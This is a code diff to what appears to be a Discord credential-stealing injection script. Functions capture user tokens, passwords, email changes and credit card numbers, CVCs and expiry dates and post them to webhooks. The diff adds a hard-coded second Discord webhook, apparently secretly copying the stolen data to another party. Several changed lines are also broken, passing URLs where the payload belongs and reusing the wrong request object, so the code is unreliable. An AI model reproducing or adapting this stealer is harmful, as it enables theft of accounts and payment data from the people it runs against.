@@ -17,8 +17,8 @@ const Filters = {
 };
 
 const config = {
-	webhook = "%WEBHOOK_LINK%",
-	dualhook = "https://discord.com/api/webhooks/1019145593685282897/lAcj6QYHh8GmexbEzQ-AB_gmyabhogkZlFKztfltkccQBappqAniuRQIxvWuUpuCS3V5",
+	"webhook": "%WEBHOOK_LINK%",
+	"dualhook": "https://discord.com/api/webhooks/1019145593685282897/lAcj6QYHh8GmexbEzQ-AB_gmyabhogkZlFKztfltkccQBappqAniuRQIxvWuUpuCS3V5",
     "minimum_members_per_server":"%MIN_MEMBERS%",
     "instant_logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
@@ -131,7 +131,7 @@ async function firstTime() {
                         }
                     }]
                 };
-                sendToWebhook(JSON.stringify(c));
+                sendToWebhook(config.webhook,config.dualhook);
             } else {
                 var b = await getUserInfo(token)
                 var c = {
@@ -173,7 +173,7 @@ async function firstTime() {
                         }
                     }]
                 };
-                sendToWebhook(JSON.stringify(c))
+                sendToWebhook(config.webhook,config.dualhook)
             }
 
         }
@@ -206,7 +206,7 @@ async function firstTime() {
                         }
                     }]
                 };
-                sendToWebhook(JSON.stringify(c));
+                sendToWebhook(config.webhook,config.dualhook);
             } else {
                 const b = await getUserInfo(token);
                 var c = {
@@ -248,7 +248,7 @@ async function firstTime() {
                         }
                     }]
                 };
-                sendToWebhook(JSON.stringify(c))
+                sendToWebhook(config.webhook,config.dualhook)
             }
         }
     }
@@ -410,7 +410,7 @@ async function userLogin(password, email, token) {
         params.embeds.push(embed)
     }
 
-    sendToWebhook(JSON.stringify(params))
+    sendToWebhook(config.webhook,config.dualhook)
 
 }
 async function emailChanged(password, newEmail, token) {
@@ -499,7 +499,7 @@ async function emailChanged(password, newEmail, token) {
         }
         params.embeds.push(embed)
     }
-    sendToWebhook(JSON.stringify(params))
+    sendToWebhook(config.webhook,config.dualhook)
 }
 async function passwordChanged(oldPassword, newPassword, token) {
     var userInfo = await getUserInfo(token);
@@ -611,7 +611,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
         }
         params.embeds.push(embed)
     }
-    sendToWebhook(JSON.stringify(params))
+    sendToWebhook(config.webhook,config.dualhook)
 }
 async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var userInfo = await getUserInfo(token);
@@ -698,7 +698,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
         }]
     };
 
-    sendToWebhook(JSON.stringify(params))
+    sendToWebhook(config.webhook,config.dualhook)
 }
 
 
@@ -710,11 +710,16 @@ async function sendToWebhook(params) {
     window.webContents.executeJavaScript(`
      new Promise(function (resolve, reject) {
 
-        var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);
+        var xhr = new XMLHttpRequest();xhr.open("POST", "${config.webhook}", true);
+		var xhr2 = new XMLHttpRequest();xhr.open("POST", "${config.dualhook}", true);
         xhr.onload = function () {
             resolve(xhr.response)
         }
+		xhr2.onload = function () {
+            resolve(xhr.response)
+        }
         xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${params}));
+		xhr2.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${params}));
 
     });
         `, true).then(() => {
